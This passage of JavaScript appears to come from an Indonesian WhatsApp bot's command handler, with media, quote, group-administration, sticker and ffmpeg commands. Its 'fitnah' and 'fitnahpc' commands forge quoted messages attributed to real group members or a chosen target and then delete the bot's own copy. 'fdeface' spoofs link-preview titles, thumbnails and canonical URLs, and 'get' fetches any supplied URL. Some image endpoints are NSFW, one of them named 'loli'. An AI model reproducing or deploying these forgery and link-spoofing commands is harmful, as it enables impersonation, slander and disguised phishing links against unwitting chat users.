				   for (let oa of anu.result) {
					  teks += `*${oa.id}*\n*nama:* ${oa.name}\n*arabic:* ${oa.arabic}\n*latin:* ${oa.latin}\n=============================\n`
				   }
				   reply(teks)
				break
    case 'chara':
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await idteam.sendMessage(from,li,image,{quoted: dev})
            break
     case 'waifu':
     reply(mess.wait)
waifu = await getBuffer(`https://idteam-api.herokuapp.com/waifu`)
idteam.sendMessage(from, waifu, image, {quoted: ftroli})
break
case 'loli':
reply(mess.wait)
loli = await getBuffer(`https://idteam-api.herokuapp.com/loli`)
idteam.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'sagiri':
reply(mess.wait)
loli = await getBuffer(`https://idteam-api.herokuapp.com/sagiri`)
idteam.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'neko':
reply(mess.wait)
loli = await getBuffer(`https://idteam-api.herokuapp.com/neko`)
idteam.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'megumin':
reply(mess.wait)
loli = await getBuffer(`https://idteam-api.herokuapp.com/megumin`)
idteam.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'nsfwneko':
reply(mess.wait)
loli = await getBuffer(`https://idteam-api.herokuapp.com/nsfw/neko`)
idteam.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'nsfwwaifu':
reply(mess.wait)
loli = await getBuffer(`https://idteam-api.herokuapp.com/nsfw/waifu`)
idteam.sendMessage(from, loli, image, {quoted: ftroli})
break
case 'wallpaperanime':
reply(mess.wait)
loli = await getBuffer(`https://idteam-api.herokuapp.com/wpnime`)
idteam.sendMessage(from, loli, image, {quoted: ftroli})
break

case 'husbu':
reply(mess.wait)
tod = await fetchJson(`https://idteam-api.herokuapp.com/husbu`)
tid = await getBuffer(tod.url)
idteam.sendMessage(from, tid, image, {quoted: ftroli})
break
case 'quotes':
reply(mess.wait)
tod = await fetchJson(`https://idteam-api.herokuapp.com/randomquote`)
reply(tod.quote.quotes)
break
case 'faktaunik':
reply(mess.wait)
tod = await fetchJson(`https://idteam-api.herokuapp.com/fakta`)
reply(tod.result)
break
case 'quotesbucin':
reply(mess.wait)
bucin = await fetchJson(`https://idteam-api.herokuapp.com/katabucin`)
reply(bucin.result)
break
case 'quotesmuslim':
reply(mess.wait)
tod = await fetchJson(`https://idteam-api.herokuapp.com/randomquote/muslim`)
reply(tod.result.text_id)
break
case 'quoteskanye':
reply(mess.wait)
tod = await fetchJson(`https://idteam-api.herokuapp.com/quotes/kanye`)
reply(tod.result.text_id)
break

case 'wallpaper':
reply(mess.wait)
tod = await fetchJson(`https://idteam-api.herokuapp.com/random/wallpaper`)
idteam.sendMessage(from, await getBuffer(tod.result.url), image, {quoted: ftroli})
break
case 'darkjokes':
reply(mess.wait)
					data = fs.readFileSync('./lib/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					idteam.sendMessage(from, hasil, image, {quoted: ftroli, caption: '*GELAP BOS :V*'})
				break
    case 'pinterest':
        
            if(!q) return reply('gambar apa?')
            reply(mess.wait)
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await idteam.sendMessage(from,di,image,{quoted: dev})
            break
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
    case 'on':
            if (!dev.key.fromMe && !isOwner) return 
            offline = false
            fakestatus(' ```ANDA TELAH ONLINE``` ')
            break       
    case 'status':
            fakestatus(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
    case 'off':
            if (!dev.key.fromMe && !isOwner) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            fakestatus(' ```ANDA TELAH OFFLINE``` ')
            break   
    case 'get':
            if(!q) return reply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
     case 'ttstalk':
     if (!q) return reply('masukan username tiktoknya kak!')
tod = await fetchJson(`https://idteam-api.herokuapp.com/tiktod/stalk/?username=${q}`)
tid = tod.result.user
ted = tod.result.stats
huft = await getBuffer(tid.avatarLarger)
teks = `Name : ${tid.uniqueId}\n`
teks += `Followers : ${ted.followerCount}\n`
teks += `Following : ${ted.followingCount}\n`
teks += `heart : ${ted.heart}\n`
teks += `heartCount : ${ted.heartCount}\n`
teks += `Video : ${ted.videoCount}`
idteam.sendMessage(from, huft, image, {quoted: ftroli, caption: teks})
break
case 'gogle':
if (!q) return reply('Mau cari apa kak?')
anu = await fetchJson(`https://idteam-api.herokuapp.com/google?q=${q}`)
		   for (let co of anu.result) {
					  teks += `
\nTITLE : ${co.title}\nSNIPPET : ${co.snippet}
\nLINK : ${co.link}\n`
				   }
				   reply(teks)
				break
case 'caklontong':
tod = await fetchJson(`https://idteam-api.herokuapp.com/kuis/caklontong?apikey=MASUKAN_APIKEY`)
tid = tod.result.soal
ted = tod.result.deskripsi
reply(tid)
setTimeout( () => {
reply(ted)
}, 20000)
break
case 'tebakgambar':
tod = await fetchJson(`https://idteam-api.herokuapp.com/kuis/tebakgambar?apikey=MASUKAN_APIKEY`)
tid = await getBuffer(tod.result.images)
ted = tod.result.jawaban
idteam.sendMessage(from, tid, image, {quoted: ftroli, caption: 'Tebak gambar nya dalam 30 detik'})
setTimeout( () => {
reply(ted)
}, 30000)
break

case 'antilink':
					if (!isGroup) return reply('Kusus group')
					if (!isGroupAdmins) return reply('Kusus admin')
					if (!isBotGroupAdmins) return reply('Bot jadiin admin dlu')
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antilink 1`)
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('Sudah Aktif Kak')
						antilink.push(from)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('_Success mengaktifkan antilink digroup ini!_')
					} else if (Number(args[0]) === 0) {
						if (!isAntiLink) return reply('Sudah Mati Kak')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('_Success mematikan antilink digroup ini!_')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break
					case 'antivirtex':
if (!isGroup) return reply('Kusus group')
if (!isGroupAdmins) return reply('Kusus admin')
if (!isBotGroupAdmins) return reply('Bot jadiin admin dlu')
if (args.length < 1) return reply('ketik 1 untuk mengaktifkan\nketik 0 untuk menonaktifkan')
if (args[0] === "1") {
if (AntiVirtex) return reply('Sudah Aktif')
antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
reply('_Succes menyalakan antivirtex di group ini_')
} else if (args[0] === "0") {
if (!AntiVirtex) return reply('Sudah Mati')
let off = antivirtex.indexOf(from)
antivirtex.splice(off, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
reply('_Succes mematikan antivirtex di group ini_')
} else {
reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
}
break
case 'add':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner & !dev.key.fromMe & !isGroupAdmins) return reply(mess.admin)
					if (!isBotGroupAdmins) return reply(mess.badmin)
					if (args.length < 1) return reply('Yang mau di add jin ya?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara mas')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						idteam.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
					case 'kick':
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin!')
if (!isGroup) return
if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return;
if (dev.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = dev.message.extendedTextMessage.contextInfo.mentionedJid
if (entah.length > 1) {
var mems_ids = []
for (let ids of entah) {
mems_ids.push(ids)
}
idteam.groupRemove(from, mems_ids)
} else {
idteam.groupRemove(from, [entah[0]])
}
} else {
entah = idteam.message.extendedTextMessage.contextInfo.participant
idteam.groupRemove(from, [entah])
}
break
case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
linkgc = await idteam.groupInviteCode(from)
yeh = `\`\`\`「 Link Group 」\`\`\`\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n\n_yo bisa yo ramein_`
idteam.sendMessage(from, yeh, text, { quoted: dev })
break

case 'group':
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
if (args[0] === 'open') {
idteam.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'close') {
idteam.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
break

case 'setdesc':
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
idteam.groupUpdateDescription(from, `${args.join(" ")}`)
break

case 'setname':
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
idteam.groupUpdateSubject(from, `${args.join(" ")}`)
idteam.sendMessage(from, 'Succes change name group', text, {quoted:dev})
break

case 'demote':
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply members')
mentionede = dev.message.extendedTextMessage.contextInfo.participant
idteam.groupDemoteAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes demote`
idteam.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[mentionede]}})
break

case 'promote':
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply members')
mentionede = dev.message.extendedTextMessage.contextInfo.participant
idteam.groupMakeAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes promote`
idteam.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[mentionede]}})
break

case 'revoke':
if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
idteam.revokeInvite(from)
reply('_Success_')
break
            case 'trigger':
            case 'wanted':
            case 'wasted':
            case 'blur':
            case 'trash':
            case 'circle':
if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
reply(mess.wait)
owgi = await idteam.downloadMediaMessage(ger)
anu = await upload(owgi)           
titid = await getBuffer(`https://idteam-api.herokuapp.com/canvas/${command}?url=${anu}`)               
idteam.sendMessage(from, titid, image, {quoted : ftroli, caption: '_Success_'}) 
} else {
reply('_Fotonya mana kak?_')
}
break
    case 'kontag':
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            idteam.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await idteam.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await idteam.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            idteam.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await idteam.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await idteam.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            idteam.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await idteam.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await idteam.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            idteam.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await idteam.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await idteam.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            idteam.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await idteam.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await idteam.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            idteam.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'fitnah':
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            idteam.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'fitnahpc':
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await idteam.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await idteam.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await idteam.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            idteam.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await idteam.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            idteam.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await idteam.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            idteam.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
     case 'addrespon':{
          if (!isOwner && !dev.key.fromMe) return reply(mess.owner)
          if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input1 = body.slice(11)
          if (!input1.includes('|')) return reply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input = input1.split("|")
          if (checkCommands(input[0], commandsDB) === true) return reply(`Command tersebut sudah ada`)
          addCommands(input[0], input[1], sender, commandsDB) 
          reply(`Key : ${input[0]}\nRespon : ${input[1]}\n\nRespon berhasil di set`)
          }
      break
      case 'dellrespon':
      case 'delrespon':{
          if (!isOwner && !dev.key.fromMe) return reply(mess.owner)
            if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon key\n\nContoh : ${prefix}delrespon hai`)
          if (!checkCommands(body.slice(11), commandsDB)) return reply(`Key tersebut tidak ada di database`)
          deleteCommands(body.slice(11), commandsDB)
          reply(`Berhasil menghapus respon dengan key ${body.slice(11)}`)
          }
      break
        case 'listrespon':{
          let txt = `List Respon\nTotal : ${commandsDB.length}\n\n`
          for (let i = 0; i < commandsDB.length; i++){
          txt += `❏ Key : ${commandsDB[i].pesan}\n`
          }
          reply(txt)
          }
        break
    case 'reverse':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await idteam.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            idteam.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'owner':
let ini_list = []
for (let i of ownerNumber) {
const vname = idteam.contacts[i] != undefined ? idteam.contacts[i].vname || idteam.contacts[i].notify : undefined
ini_list.push({
"displayName": 'ID Team',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${idteam.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await idteam.sendMessage(from, {
"displayName": `${ini_list.length} kontak`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: dev })
idteam.sendMessage(from,'Nih Kak Creator ID Team',text,{quoted: hehe})
break

    case 'developer':
let ini_lista = []
for (let i of devNumber) {
const namaye = idteam.contacts[i] != undefined ? idteam.contacts[i].namaye || idteam.contacts[i].notify : undefined
ini_lista.push({
"displayName": 'ID Team',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${namaye ? `${namaye}` : `${idteam.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await idteam.sendMessage(from, {
"displayName": `${ini_lista.length} kontak`,
"contacts": ini_lista
}, 'contactsArrayMessage', { quoted: dev })
idteam.sendMessage(from,'Nih Kak Developer ID Team',text,{quoted: hehe})
break

case 'style':
				  if(!q) return reply('Masukkan teks!')
         reply(mess.wait)
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${body.slice(7)}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      idteam.sendMessage(from, hasil, MessageType.text, { quoted: dev});
    })
			break
case 'pastebin':
if(!q) return reply(`Example : ID Bot`)
anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
                   idteam.sendMessage(from, `${anu.result}`, text, {quoted: ftroli})
                     break
    case 'anime':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            idteam.sendMessage(from,media,image,{quoted:dev,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            idteam.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    case 'take':
    case 'colong':
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await idteam.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `ID Team`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, idteam, dev, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !dev.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
             media = await idteam.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            idteam.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            idteam.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && dev.message.videoMessage.seconds < 11 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            const media = await idteam.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            idteam.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            idteam.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if (!q) return fakestatus('Isi teksnya!')
            idteam.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            cihcih = await idteam.downloadMediaMessage(swsw)
            idteam.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            idteam.sendMessage(from, bur, text, { quoted: dev })
            } else {
            fakestatus('Reply gambarnya!')
            }
            break
    case 'upswvideo':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            cihcih = await idteam.downloadMediaMessage(swsw)
            idteam.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            idteam.sendMessage(from, bur, text, { quoted: dev })
            } else {
            fakestatus('reply videonya!')
            }
            break
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            const tipes = await idteam.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anu = {
        	detectLinks: false
    		}
    		var mat = await idteam.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
